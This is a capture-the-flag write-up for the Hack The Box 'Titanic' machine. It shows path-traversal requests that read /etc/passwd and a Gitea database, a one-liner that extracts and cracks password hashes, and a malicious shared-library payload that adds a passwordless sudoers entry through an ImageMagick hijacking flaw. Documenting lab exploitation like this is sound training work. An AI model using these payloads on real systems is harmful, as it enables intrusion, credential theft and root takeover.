---
clayout: ctf
title: Titanic
date: 2025-05-12
image: /ctf/hack-the-box/machines/titanic/info-card.png
type: Hack The Box

ctf:
    - name: Titanic
      link: https://app.hackthebox.com/machines/648
      thumbnail: /ctf/hack-the-box/machines/titanic/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/648
          thumbnail: /ctf/hack-the-box/machines/titanic/pwned.png
---

# Enumeration

## Nmap Scan

We began by performing a full TCP port scan with service and version detection against the target machine:

```bash
nmap -sC -sV -v -A -p- -oN nmap.txt 10.10.11.55
```

The scan revealed two open ports:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 73039c76eb04f1fec9e980449c7f1346 (ECDSA)
|_  256 d5bd1d5e9a861ceb88634d5f884b7e04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

**Key findings:**

- Port 80: Apache HTTP Server 2.4.52, responds with a redirect to `http://titanic.htb/`
- Port 22: OpenSSH 8.9p1 running on Ubuntu

## Web Enumeration

### Hostname Resolution

To resolve the redirect to titanic.htb, the hostname was added to /etc/hosts:

```bash
echo "10.10.11.55 titanic.htb" >> /etc/hosts
```

### Web Application

Upon visiting the site, a basic web interface is presented:

![Titanic - web page](/ctf/hack-the-box/machines/titanic/web-page.png)

Using Wappalyzer, we identified the backend technology as **Flask**, a Python web framework:

![Titanic - wappalyzer](/ctf/hack-the-box/machines/titanic/wappalyzer.png)

Clicking the `Book now` button reveals a booking form:

![Titanic - booking form](/ctf/hack-the-box/machines/titanic/booking-form.png)

Submitting the form downloads a `.json` ticket file with the following structure:

```json
{
  "name": "John Doe",
  "email": "john.doe@example.com",
  "phone": "1234567890",
  "date": "2021-01-01",
  "cabin": "Standard"
}
```

### Ticket Parameter

Using `Burp Suite` to intercept the response, we observed the download URL:

```text
/download?ticket=565f8e65-cf6d-49ff-9af1-35392f13d966.json
```

This suggests the `ticket` parameter accepts UUID-based filenames and may be vulnerable to `path traversal` or `LFI`.

### Local File Inclusion (LFI)

To test for LFI, we attempted to access `/etc/passwd`:

```text
/download?ticket=/etc/passwd
```

The request returned system file contents, confirming the LFI vulnerability:

```text
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

Using this information, we accessed the user flag:

```text
/download?ticket=/home/developer/user.txt
```

## Subdomain Enumeration

We used `ffuf` to enumerate subdomains:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.titanic.htb" -u http://titanic.htb -fc 301
```

![Titanic - ffuf subdomains](/ctf/hack-the-box/machines/titanic/ffuf-subdomain.png)

The scan identified a valid subdomain: `dev.titanic.htb`.

### Enumerating the `dev` subdomain

After adding the subdomain to `/etc/hosts`:

```bash
echo "10.10.11.55 dev.titanic.htb" >> /etc/hosts
```

We discovered a [Gitea](https://about.gitea.com/) instance hosting two repositories:

- `docker-config`
- `flask-app`

![Titanic - repositories](/ctf/hack-the-box/machines/titanic/repositories.png)

#### Repository: `docker-config`

Inside the `docker-config` repository, we found a `docker-compose.yml` file:

```yaml
services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: "MySQLP@$$w0rd!"
      MYSQL_DATABASE: tickets
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

This reveals MySQL root credentials, though port 3306 is locally bound and not externally accessible:

```bash
PORT     STATE  SERVICE VERSION
3306/tcp closed mysql
```

In the `docker-compose.yml` file of the `gitea` service, we can see the following:

```yaml
services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22" # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

In your Docker Compose setup, the Gitea service mounts the host directory `/home/developer/gitea/data` to the container's `/data` directory. By default, Gitea stores its SQLite database file at `/data/gitea/gitea.db` inside the container. Given the volume mapping, this corresponds to the following path on the host system:

```text
/home/developer/gitea/data/gitea/gitea.db
```

## Extracting Credentials via LFI

Using the LFI vulnerability, we retrieved the `gitea.db` SQLite database file:

![Titanic - gitea.db](/ctf/hack-the-box/machines/titanic/gitea-db.png)

We then used `sqlite3` to explore the contents:

```bash
sqlite3 gitea.db
sqlite> .tables
sqlite> SELECT * FROM user;
```

We extracted the password hashes and salt values and converted them into a format suitable for hashcat:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

We then cracked the hashes using hashcat:

```bash
hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user
```

Result: Password for `developer` user: `25[REDACTED]28`

## SSH Access

With valid credentials, we logged into the system via SSH:

```bash
ssh developer@titanic.htb
```

<br>

# Privilege Escalation

## Scheduled Script Discovery

We identified a script `/opt/app/static/assets/images/identify_images.sh` executed by root:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

The script uses ImageMagick version 7.1.1-35, which is vulnerable to a known shared library hijacking issue [(GHSA-8rxc-922v-phg8)](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8).

## Exploitation

To escalate privileges, we crafted a malicious shared library (libxcb.so.1) to be loaded by magick:

```c
gcc -shared -fPIC -o libxcb.so.1 -nostartfiles -x c - <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
EOF

```

We moved the library to the monitored directory:

```bash
mv libxcb.so.1 /opt/app/static/assets/images/
```

Once the scheduled script executed, the developer user was granted passwordless sudo access. The root flag is located in the `/root/root.txt` file.
